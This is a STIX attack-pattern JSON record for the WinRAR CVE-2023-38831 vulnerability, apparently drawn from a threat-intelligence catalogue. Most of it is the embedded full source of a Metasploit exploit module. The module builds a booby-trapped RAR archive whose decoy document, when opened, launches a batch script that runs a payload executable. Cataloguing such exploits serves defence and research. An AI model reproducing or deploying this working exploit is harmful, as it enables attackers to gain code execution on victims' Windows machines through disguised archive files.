{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dd8e8c46-6cfa-4d46-861e-531b784b7c13",
    "created": "2024-08-14T16:37:11.860787Z",
    "modified": "2024-08-14T16:37:11.860791Z",
    "name": "WinRAR CVE-2023-38831 Exploit",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/winrar_cve_2023_38831.rb",
            "external_id": "winrar_cve_2023_38831.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-38831"
        },
        {
            "source_name": "reference",
            "url": "https://www.group-ib.com/blog/cve-2023-38831-winrar-zero-day/"
        },
        {
            "source_name": "reference",
            "url": "https://b1tg.github.io/post/cve-2023-38831-winrar-analysis/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WinRAR CVE-2023-38831 Exploit',\n        'Description' => %q{\n          This module exploits a vulnerability in WinRAR (CVE-2023-38831). When a user opens a crafted RAR file and its\n          embedded document, the decoy document is executed, leading to code execution.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Alexander \"xaitax\" Hagenah'],\n        'References' => [\n          ['CVE', '2023-38831'],\n          ['URL', 'https://www.group-ib.com/blog/cve-2023-38831-winrar-zero-day/'],\n          ['URL', 'https://b1tg.github.io/post/cve-2023-38831-winrar-analysis/']\n        ],\n        'Platform' => ['win'],\n        'Arch' => [ ARCH_X64, ARCH_X86 ],\n        'Targets' => [['Windows', {}]],\n        'Payload' => {\n          'DisableNops' => true\n        },\n        'DisclosureDate' => '2023-08-23',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('OUTPUT_FILE', [true, 'The output filename.', 'poc.rar']),\n      OptPath.new('INPUT_FILE', [true, 'Path to the decoy file (PDF, JPG, PNG, etc.).'])\n    ])\n\n    register_advanced_options([\n      OptString.new('PAYLOAD_NAME', [false, 'The filename for the payload executable.', nil])\n    ])\n  end\n\n  def exploit\n    Dir.mktmpdir do |temp_dir|\n      output_rar = File.join(Msf::Config.local_directory, datastore['OUTPUT_FILE'])\n      input_file = datastore['INPUT_FILE']\n      decoy_name = File.basename(input_file)\n      decoy_ext = \".#{File.extname(input_file)[1..]}\"\n      payload_name = datastore['PAYLOAD_NAME'] || Rex::Text.rand_text_alpha(8) + '.exe'\n\n      decoy_dir = File.join(temp_dir, \"#{decoy_name}A\")\n      Dir.mkdir(decoy_dir)\n\n      payload_path = File.join(decoy_dir, payload_name)\n      File.open(payload_path, 'wb') { |file| file.write(generate_payload_exe) }\n\n      bat_script = <<~BAT\n        @echo off\n        start \"\" \"%~dp0#{payload_name}\"\n        start \"\" \"%~dp0#{decoy_name}\"\n      BAT\n\n      bat_path = File.join(decoy_dir, \"#{decoy_name}A.cmd\")\n      File.write(bat_path, bat_script)\n\n      FileUtils.cp(input_file, File.join(temp_dir, \"#{decoy_name}B\"))\n\n      zip_path = File.join(temp_dir, 'template.zip')\n      Zip::File.open(zip_path, Zip::File::CREATE) do |zipfile|\n        zipfile.add(\"#{decoy_name}B\", File.join(temp_dir, \"#{decoy_name}B\"))\n        zipfile.add(\"#{decoy_name}A/#{decoy_name}A.cmd\", bat_path)\n        zipfile.add(\"#{decoy_name}A/#{payload_name}\", payload_path)\n      end\n\n      content = File.binread(zip_path)\n      content.gsub!(decoy_ext + 'A', decoy_ext + ' ')\n      content.gsub!(decoy_ext + 'B', decoy_ext + ' ')\n\n      File.binwrite(output_rar, content)\n\n      print_good(\"Created #{output_rar}\")\n    end\n  end\n\nend\n",
    "x_mitre_contributors": [
        "[Alexander \"xaitax\" Hagenah]",
        ""
    ],
    "x_mitre_disclosure_date": "2023-08-23",
    "x_mitre_platforms": [
        "['win']"
    ]
}